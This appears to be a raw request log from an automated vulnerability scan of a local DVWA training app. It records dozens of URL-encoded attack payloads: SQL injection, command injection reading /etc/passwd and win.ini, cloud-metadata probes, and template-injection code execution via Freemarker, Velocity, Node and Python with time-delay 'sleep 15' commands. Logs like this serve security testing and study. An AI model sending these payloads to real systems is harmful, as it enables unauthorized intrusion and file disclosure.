142,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26cat+%2Fetc%2Fpasswd%26%27&Submit=Submit,302,Found,1,628,0
143,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bcat+%2Fetc%2Fpasswd%3B%27&Submit=Submit,302,Found,2,628,0
144,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=type+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,0,628,0
145,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26type+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,2,628,0
146,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,1,628,0
147,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&Submit=Submit,302,Found,1,628,0
148,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,0,628,0
149,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&Submit=Submit,302,Found,4,628,0
150,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,1,628,0
151,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=get-help&Submit=Submit,302,Found,1,628,0
152,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bget-help&Submit=Submit,302,Found,1,628,0
153,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bget-help&Submit=Submit,302,Found,1,628,0
154,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bget-help&Submit=Submit,302,Found,2,628,0
155,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bget-help+%23&Submit=Submit,302,Found,1,628,0
156,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=cat+%2Fetc%2Fpasswd,302,Found,0,628,0
157,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26cat+%2Fetc%2Fpasswd%26,302,Found,1,628,0
158,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bcat+%2Fetc%2Fpasswd%3B,302,Found,1,628,0
159,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26cat+%2Fetc%2Fpasswd%26%22,302,Found,1,628,0
160,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bcat+%2Fetc%2Fpasswd%3B%22,302,Found,1,628,0
161,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26cat+%2Fetc%2Fpasswd%26%27,302,Found,0,628,0
162,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bcat+%2Fetc%2Fpasswd%3B%27,302,Found,1,628,0
163,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=type+%25SYSTEMROOT%25%5Cwin.ini,302,Found,0,628,0
164,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26type+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
165,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
166,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,302,Found,1,628,0
167,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
168,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,302,Found,0,628,0
169,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
170,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=get-help,302,Found,1,628,0
171,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bget-help,302,Found,1,628,0
172,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bget-help,302,Found,1,628,0
173,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bget-help,302,Found,1,628,0
174,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bget-help+%23,302,Found,1,628,0
175,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%27&Submit=Submit,302,Found,1,628,0
176,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,243,366
177,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%21--&Submit=Submit,302,Found,2,628,0
178,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%5D%5D%3E&Submit=Submit,302,Found,2,628,0
179,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%27,302,Found,1,628,0
180,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%21--,302,Found,1,628,0
181,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%5D%5D%3E,302,Found,0,628,0
182,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
183,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
184,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,3,161,317
185,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,0,161,317
186,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/computeMetadata/v1/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,317
187,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/computeMetadata/v1/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,326
188,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/opc/v1/instance/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,317
189,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/opc/v1/instance/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,326
190,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj+1187*6926+zj&Submit=Submit,302,Found,0,628,0
191,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,0,161,317
192,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,321
193,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B5392*6345%7Dzj&Submit=Submit,302,Found,1,628,0
194,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/metadata/instance?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,317
195,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%24%7B7474*2087%7Dzj&Submit=Submit,302,Found,2,628,0
196,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%23%7B5011*1592%7Dzj&Submit=Submit,302,Found,1,628,0
197,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%235268*8769%7Dzj&Submit=Submit,302,Found,1,628,0
198,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%408240*9490%7Dzj&Submit=Submit,302,Found,1,628,0
199,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7B5093*7710%7D%7Dzj&Submit=Submit,302,Found,1,628,0
200,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7B%3D8694*8427%7D%7Dzj&Submit=Submit,302,Found,1,628,0
201,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%3C%25%3D3870*3620%25%3Ezj&Submit=Submit,302,Found,1,628,0
202,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%23set%28%24x%3D8998*2763%29%24%7Bx%7Dzj&Submit=Submit,302,Found,1,628,0
203,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%3Cp+th%3Atext%3D%22%24%7B5583*3057%7D%22%3E%3C%2Fp%3Ezj&Submit=Submit,302,Found,1,628,0
204,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%40math+key%3D%229513%22+method%3D%22multiply%22+operand%3D%225550%22%2F%7Dzj&Submit=Submit,302,Found,1,628,0
205,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7B71630%7Cadd%3A97810%7D%7Dzj&Submit=Submit,302,Found,14,628,0
206,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7Bprint+%229730%22+%226095%22%7D%7Dzj&Submit=Submit,302,Found,3,628,0
207,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj+6747*5580+zj,302,Found,4,628,0
208,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B8764*8224%7Dzj,302,Found,1,628,0
209,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%24%7B6517*8756%7Dzj,302,Found,1,628,0
210,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%23%7B9426*5652%7Dzj,302,Found,3,647,0
211,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%239638*4805%7Dzj,302,Found,2,628,0
212,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%403688*1351%7Dzj,302,Found,1,628,0
213,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7B6065*2330%7D%7Dzj,302,Found,1,628,0
214,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7B%3D8358*4711%7D%7Dzj,302,Found,0,628,0
215,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%3C%25%3D5282*1517%25%3Ezj,302,Found,1,628,0
216,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%23set%28%24x%3D6394*9042%29%24%7Bx%7Dzj,302,Found,0,628,0
217,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%3Cp+th%3Atext%3D%22%24%7B1454*4053%7D%22%3E%3C%2Fp%3Ezj,302,Found,1,628,0
218,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%40math+key%3D%225377%22+method%3D%22multiply%22+operand%3D%229325%22%2F%7Dzj,302,Found,1,628,0
219,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7B90180%7Cadd%3A66970%7D%7Dzj,302,Found,1,628,0
220,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7Bprint+%227670%22+%228099%22%7D%7Dzj,302,Found,1,628,0
221,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
222,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&Submit=Submit,302,Found,2,628,0
223,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&Submit=Submit,302,Found,1,628,0
224,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&Submit=Submit,302,Found,1,628,0
225,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E&Submit=Submit,302,Found,0,628,0
226,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D&Submit=Submit,302,Found,1,628,0
227,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&Submit=Submit,302,Found,2,628,0
228,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&Submit=Submit,302,Found,0,628,0
229,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D&Submit=Submit,302,Found,2,628,0
230,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D&Submit=Submit,302,Found,2,628,0
231,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%25%3D%25x%28sleep+15%29%25%3E&Submit=Submit,302,Found,1,628,0
232,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23%7B%25x%28sleep+15%29%7D&Submit=Submit,302,Found,1,628,0
233,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7Bsystem%28%22sleep+15%22%29%7D&Submit=Submit,302,Found,1,628,0
234,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,302,Found,1,628,0
235,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,302,Found,0,628,0
236,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,302,Found,1,628,0
237,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,302,Found,1,628,0
238,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,302,Found,1,628,0
239,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,302,Found,1,628,0
240,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,302,Found,1,628,0
241,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,302,Found,1,628,0
242,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,302,Found,1,628,0
243,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%25%3D%25x%28sleep+15%29%25%3E,302,Found,1,628,0
244,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23%7B%25x%28sleep+15%29%7D,302,Found,1,628,0
245,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7Bsystem%28%22sleep+15%22%29%7D,302,Found,1,628,0
246,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
247,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26sleep+15.0%26&Submit=Submit,302,Found,1,628,0
248,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bsleep+15.0%3B&Submit=Submit,302,Found,1,628,0
249,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26sleep+15.0%26%22&Submit=Submit,302,Found,1,628,0
250,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bsleep+15.0%3B%22&Submit=Submit,302,Found,1,628,0
251,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26sleep+15.0%26%27&Submit=Submit,302,Found,1,628,0
252,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bsleep+15.0%3B%27&Submit=Submit,302,Found,1,628,0
253,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26timeout+%2FT+15.0&Submit=Submit,302,Found,0,628,0
254,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%7Ctimeout+%2FT+15.0&Submit=Submit,302,Found,2,628,0
255,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26timeout+%2FT+15.0%26%22&Submit=Submit,302,Found,3,628,0
256,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%7Ctimeout+%2FT+15.0&Submit=Submit,302,Found,2,628,0
